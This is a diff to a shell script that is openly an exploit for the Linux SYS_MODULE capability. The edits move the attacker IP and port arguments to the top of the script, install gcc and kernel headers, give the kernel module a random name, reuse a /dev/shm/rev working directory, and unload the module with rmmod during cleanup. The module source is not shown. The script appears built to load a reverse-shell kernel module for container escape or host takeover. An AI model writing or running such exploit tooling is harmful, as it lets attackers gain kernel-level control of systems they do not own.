@@ -1,10 +1,14 @@
 #!/bin/sh
 
+ip=$1
+port=$2
+installRequiredFiles=$3
+
 install_with_pkg()
 {
     arg1=$1
     arg2=$2
-    #echo $arg1
+
     
     echo "[+] Running update: $arg1 update."
     $arg1 update
@@ -17,6 +21,9 @@ install_with_pkg()
     
     echo "[+] Installing GCC: $arg2 gcc."
     $arg2 gcc
+
+    echo "[+] Installing linux-headers: $arg1 install -y build-essential linux-headers-$(uname -r)."
+    $arg2 build-essential linux-headers-$(uname -r)
 }
 
 
@@ -24,14 +31,9 @@ exploitSysModule(){
   RED=$(tput bold)$(tput setaf 1)
   DEFAULT_COLOR=$(tput sgr0)
 
-  ip=$1
-  port=$2
-  installRequiredFiles=$3
-  
+
   echo "[i] Exploiting SYS_MODULE"
-  echo $ip
-  echo $port
-  echo $installRequiredFiles
+
 
   if [ $installRequiredFiles = "true" ]; then
       if [ -x "$(command -v apt)" ]; then
@@ -83,9 +85,10 @@ exploitSysModule(){
 #  fi
 
   module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)
+  echo "kernel module name $module_name"
   sys_cwd=$(pwd)
 
-  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1
+  ([ -d "/dev/shm/rev" ] || mkdir /dev/shm/rev) && cd /dev/shm/rev || exit 1
 
   echo "[i] Writing scripts..."
 
@@ -137,6 +140,9 @@ EOF
   fi
 
   echo "[i] Cleaning up..."
+  if  [ -x "$(command -v rmmod)" ]; then
+    rmmod $module_name
+  fi
 
   rm -r /dev/shm/rev
 
